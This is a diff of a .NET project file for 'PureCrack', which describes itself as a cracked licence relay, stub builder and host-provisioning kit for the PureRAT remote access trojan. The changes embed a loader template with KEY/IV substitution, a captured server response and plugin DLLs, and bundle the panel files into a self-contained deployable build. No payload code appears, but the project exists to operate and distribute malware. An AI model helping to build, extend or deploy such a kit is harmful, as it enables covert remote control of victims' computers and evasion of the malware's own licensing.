@@ -13,9 +13,9 @@
     <ApplicationManifest>app.manifest</ApplicationManifest>
     <NoWarn>CS8002</NoWarn>
     <AppendTargetFrameworkToOutputPath>false</AppendTargetFrameworkToOutputPath>
-    <Version>2.0.0</Version>
+    <Version>3.0.0</Version>
     <Product>PureCrack</Product>
-    <Description>PureRAT v4.0.9596 licence relay + dynamic stub builder.</Description>
+    <Description>PureRAT v4.0.9596 single-binary lifetime kit — relay + stub builder + host provisioning + frozen-target verification.</Description>
   </PropertyGroup>
 
   <!--
@@ -47,12 +47,10 @@
 
   <!--
     Embedded resources:
-      assets/inner/*.cs            — 32 inner DLL source files (panel-side runtime).
-      assets/inner/Loader.tmpl     — outer EXE template, KEY/IV substituted at build time.
-
-    Binary dependencies (protobuf-net.dll, compile_response.bin) are not
-    included in this repo — download the full kit or acquire them separately
-    (see README.md).
+      assets/inner/*.cs       — 32 inner DLL source files (panel-side runtime).
+      assets/inner/Loader.cs.tmpl  — outer EXE template, KEY/IV substituted at build time.
+      assets/inner/protobuf-net.dll — referenced by inner DLL at compile time.
+      assets/compile_response.bin   — canned /compile fallback (real PureServer capture).
   -->
   <ItemGroup>
     <None Remove="assets\**" />
@@ -60,6 +58,15 @@
     <EmbeddedResource Include="assets\inner\*.cs" />
     <EmbeddedResource Include="assets\inner\Loader.tmpl">
       <LogicalName>PureCrack.assets.inner.Loader.tmpl</LogicalName>
+    </EmbeddedResource>
+    <EmbeddedResource Include="assets\inner\protobuf-net.dll">
+      <LogicalName>PureCrack.assets.inner.protobuf-net.dll</LogicalName>
+    </EmbeddedResource>
+    <EmbeddedResource Include="assets\compile_response.bin">
+      <LogicalName>PureCrack.assets.compile_response.bin</LogicalName>
+    </EmbeddedResource>
+    <EmbeddedResource Include="panel\Plugins\PluginSDK.dll">
+      <LogicalName>PureCrack.assets.pluginsdk.dll</LogicalName>
     </EmbeddedResource>
   </ItemGroup>
 
@@ -70,13 +77,12 @@
   </ItemGroup>
 
   <!--
-    Panel files (PureRAT.exe, data.pak, Plugins/) are NOT included in this repo.
-    See panel/README.md for instructions on acquiring them.
-    Before building, place PureRAT.exe + supporting files in panel/ yourself
-    (or set PURE_PANEL_EXE env var at runtime to point at an existing install).
-    If you have the panel files, uncomment the block below:
+    Bundle panel files into bin\<Cfg>\panel\ at build time so bin\<Cfg>\ is a
+    self-contained deploy unit. PreserveNewest = only copy when source is newer.
+    Explicit file list (rather than panel\**) so we never accidentally bundle
+    operator state (Settings.json, license.key, crash.dat, etc.) — those land
+    in the same dirs at runtime and would overwrite a clean bundle.
   -->
-  <!--
   <ItemGroup>
     <None    Remove="panel\**" />
     <Content Remove="panel\**" />
@@ -104,7 +110,10 @@
       <Link>panel\Plugins\PureHelper.Client.dll</Link>
       <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
     </Content>
+    <Content Include="panel\Plugins\PluginSDK.dll">
+      <Link>panel\Plugins\PluginSDK.dll</Link>
+      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
+    </Content>
   </ItemGroup>
-  -->
 
 </Project>
